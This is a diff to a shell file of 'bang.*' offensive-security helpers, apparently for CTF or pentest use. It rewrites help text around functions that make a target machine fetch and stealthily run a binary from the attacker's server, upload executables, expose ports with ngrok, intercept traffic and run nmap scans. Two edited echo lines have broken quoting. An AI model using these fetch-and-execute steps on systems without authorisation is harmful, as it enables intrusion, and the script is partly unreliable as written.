@@ -85,7 +85,7 @@ fi
 ## Fileless-xec as client (Launch a server and copy line to launch on target)
 bang.flx.client.cpy() {
 if [ "$1" = "-h" ]; then
-    echo "bang.flx.client.cpy \$AA \$AP [BINARY_NAME]"
+    echo "Copy line to send binary to a fileless-xec server: bang.flx.client.cpy \$AA \$AP [BINARY_NAME]"
 else
     echo "fileless-xec http://$1:$2/$3" | cpy && echo "Command line copied to clipboard (launch it on target machine)" && python3 -m http.server $2 
 fi
@@ -94,7 +94,7 @@ fi
 ## Fileless-xec server cpy
 bang.flx.serve.cpy() {
 if [ "$1" = "-h" ]; then
-    echo "bang.flx.serve.cpy \$AP"
+    echo "Copy line to launch fileless-xec server (then send binary to server to stealthy execute it): bang.flx.serve.cpy \$AP"
 else
     echo "fileless-xec server $1"|cpy  && echo "Command line copied to clipboard (launch it on target machine)"
 fi
@@ -103,7 +103,7 @@ fi
 ## Fileless-xec send to server
 bang.flx.send() {
 if [ "$1" = "-h" ]; then
-    echo "bang.flx.send \$TA \$TP [file]"
+    echo "Send binary to a fileless-xec server: bang.flx.send \$TA \$TP [file]"
 else
     curl -X POST -F "executable=@$3" http://$1:$2/upload
 fi
@@ -112,7 +112,7 @@ fi
 ## Gitar start
 bang.gitar() {
 if [ "$1" = "-h" ]; then
-    echo "bang.gitar \$AA"
+    echo "Start a gitar server to ease file exchange: bang.gitar \$AA"
 else
   gitar -e $1
 fi
@@ -121,7 +121,7 @@ fi
 ## "Safe" Gitar start
 bang.gitar.safe() {
 if [ "$1" = "-h" ]; then
-    echo "bang.gitar.safe \$AA"
+    echo "Start a safe gitar server to ease file exchange (docker+https): bang.gitar.safe \$AA"
 else
   docker run --rm --cap-drop=all --cap-add=dac_override -v "${PWD}:/app/upload" -v "${HOME}/.gitar/certs/:/certs:ro" -v "${PWD}:/app/download" -p 9237:9237 gitar -copy=false -u /app/upload -d /app/download -tls=true -c /certs -e $1
 fi
@@ -130,7 +130,7 @@ fi
 ## Gitar start + url override
 bang.gitar.override() {
 if [ "$1" = "-h" ]; then
-    echo "bang.gitar.override [PROXY_URL]"
+    echo "Start a gitar server with URL overriding (use it to precise proxy url of the gitar server): bang.gitar.override [PROXY_URL]"
 else
   gitar -alias-override-url=$1
 fi
@@ -139,7 +139,7 @@ fi
 ## "Safe" Gitar start + url override
 bang.gitar.safe-override() {
 if [ "$1" = "-h" ]; then
-    echo "ban.gitar.safe-override [PROXY_URL]"
+    echo "Start a safe gitar server with URL overriding (use it to precise proxy url of the gitar server): bang.gitar.safe-override [PROXY_URL]"
 else
   docker run --rm --cap-drop=all --cap-add=dac_override -v "${PWD}:/app/upload" -v "${HOME}/.gitar/certs/:/certs:ro" -v "${PWD}:/app/download" -p 9237:9237 gitar -copy=false -u /app/upload -d /app/download -tls=true -c /certs -alias-override-url=$1
 fi
@@ -148,7 +148,7 @@ fi
 ## Gitar server as a daemon 
 bang.gitar.daemon() {
 if [ "$1" = "-h" ]; then
-    echo "bang.gitar.daemon \$AA"
+    echo ""Start a gitar server as a deamon: bang.gitar.daemon \$AA"
 else
   nohup gitar -e $1 &
 fi
@@ -157,7 +157,7 @@ fi
 ## Kill gitar process
 bang.gitar.kill() {
 if [ "$1" = "-h" ]; then
-    echo "bang.gitar.kill"
+    echo "Kill a gitar server (useful when launched as a daemon): bang.gitar.kill"
 else
   sudo pkill -9 gitar
 fi
@@ -166,7 +166,7 @@ fi
 ## Gitar without completion
 bang.gitar.no-completion() {
 if [ "$1" = "-h" ]; then
-    echo "bang.gitar.no-completion [ATTACKER_ADDR]"
+    echo "Launch a gitar server without completion (when you are dealing with a shell that note handle completion): bang.gitar.no-completion [ATTACKER_ADDR]"
 else
     gitar -e $1 -completion=false
 fi
@@ -175,7 +175,7 @@ fi
 ## curl & jse
 bang.jse.after-curl() {
 if [ "$1" = "-h" ]; then
-    echo "bang.jse.after-curl [url]"
+    echo "Fetch an URL and retrieve JS in response: bang.jse.after-curl [url]"
 else
     curl -s $1 -H "Accept: text/html" | jse -u $1 -gather-scr
 fi
@@ -184,7 +184,7 @@ fi
 ## curl & TUIjse
 bang.jse.tui-after-curl() {
 if [ "$1" = "-h" ]; then
-    echo "bang.jse.tui-after-curl [url]"
+    echo "Fetch an URL and retrieve JS in response. Browse it using a Terminal based UI: bang.jse.tui-after-curl [url]"
 else
     curl -s $1 -H "Accept: text/html" | jse -u $1 -tui -gather-src
 fi
@@ -194,7 +194,7 @@ fi
 ## Ngrok expose a https service
 bang.expose.https() {
 if [ "$1" = "-h" ]; then
-    echo "bang.expose-https \$AP"
+    echo "Expose a local https service using ngrok: bang.expose-https \$AP"
 else
   ngrok http https://127.0.0.1:$1
 fi
@@ -203,7 +203,7 @@ fi
 ## Ngrok expose a port
 bang.expose() {
 if [ "$1" = "-h" ]; then
-    echo "bang.expose \$AP"
+    echo ""Expose a local port using ngrok: bang.expose \$AP"
 else
   ngrok http $1
 fi
@@ -215,7 +215,7 @@ alias bang.proxycurl='curl --proxy http://127.0.0.1:8080'
 
 bang.mitmproxy.intercept.request.domain() {
 if [ "$1" = "-h" ]; then
-    echo "bang.mitmproxy.intercept.request.domain [DOMAIN]"
+    echo "Launch mitm-proxy and configure it to catch requests to a specific domain: bang.mitmproxy.intercept.request.domain [DOMAIN]"
 else
   $HOME/.local/bin/mitmproxy --intercept "~u /*$1 & ~q" #need absolute path
 fi
@@ -223,7 +223,7 @@ fi
 
 bang.mitmproxy.intercept.request() {
 if [ "$1" = "-h" ]; then
-    echo "bang.mitmproxy.intercept.request"
+    echo "Launch mitm-proxy and configure it to catch all requests: bang.mitmproxy.intercept.request"
 else
   $HOME/.local/bin/mitmproxy --intercept "~q"
 fi
@@ -231,7 +231,7 @@ fi
 
 bang.urlencode() {
 if [ "$1" = "-h" ]; then
-    echo "bang.urlencode \"[TEXT]\""
+    echo "URL encode a texte: bang.urlencode \"[TEXT]\""
 else
   python3 -c "import urllib.parse; print(urllib.parse.quote(input()))" <<< "$1"
 fi
@@ -239,7 +239,7 @@ fi
 
 bang.urldecode() {
 if [ "$1" = "-h" ]; then
-    echo "bang.decode \"[TEXT]\""
+    echo "URL decode a texte: bang.urldecode \"[TEXT]\""
 else
   python3 -c "import urllib.parse; print(urllib.parse.unquote(input()))" <<< "$1"
 fi
@@ -248,7 +248,7 @@ fi
 
 bang.b64encode() {
 if [ "$1" = "-h" ]; then
-    echo "bang.b64encode \"[TEXT]\""
+    echo "Encode in base64 a text: bang.b64encode \"[TEXT]\""
 else
     echo "$1" | base64
 fi
@@ -256,7 +256,7 @@ fi
 
 bang.b64decode() {
 if [ "$1" = "-h" ]; then
-    echo "bang.b64decode \"[TEXT]\""
+    echo "Decode a base64 encoded text: bang.b64decode \"[TEXT]\""
 else
     echo "$1" | base64 -d
 fi
@@ -264,7 +264,7 @@ fi
 
 bang.domain2ip() {
 if [ "$1" = "-h" ]; then
-    echo "bang.domain2ip [domain]"
+    echo "Find IPs behind a specific domain: bang.domain2ip [domain]"
 else
     dig +short $1 @resolver1.opendns.com
 fi
@@ -277,7 +277,7 @@ alias bang.nmap.show-script='ll /usr/share/nmap/scripts/'
 
 bang.nmap.scan-ports() {
 if [ "$1" = "-h" ]; then
-    echo "bang.nmap.scan-ports [port] OR bang.nmap.scan-ports [from]-[to]"
+    echo "Scan a specific port with nmapbang.nmap.scan-ports [port] OR bang.nmap.scan-ports [from]-[to]"
 else
     nmap -p $1 $TA
 fi
@@ -286,16 +286,16 @@ fi
 #Intensity 5 -> for ctf not real world use
 bang.nmap.scan-top100() {
 if [ "$1" = "-h" ]; then
-    echo "bang.nmap.scan-top100"
+    echo "Scan top 100 port with nmap: bang.nmap.scan-top100"
 else
     nmap --top-port 100 $TA -sV --version-intensity 5
 fi
 }
 
-#Intensity 5 -> for ctf not real world use
+#nmap discover host alive
 bang.nmap.discovery() {
 if [ "$1" = "-h" ]; then
-    echo "bang.nmap.discovery [RANGE]"
+    echo "Discover alived host for a specific range: bang.nmap.discovery [RANGE]"
 else
     nmap $TA -sP
 fi
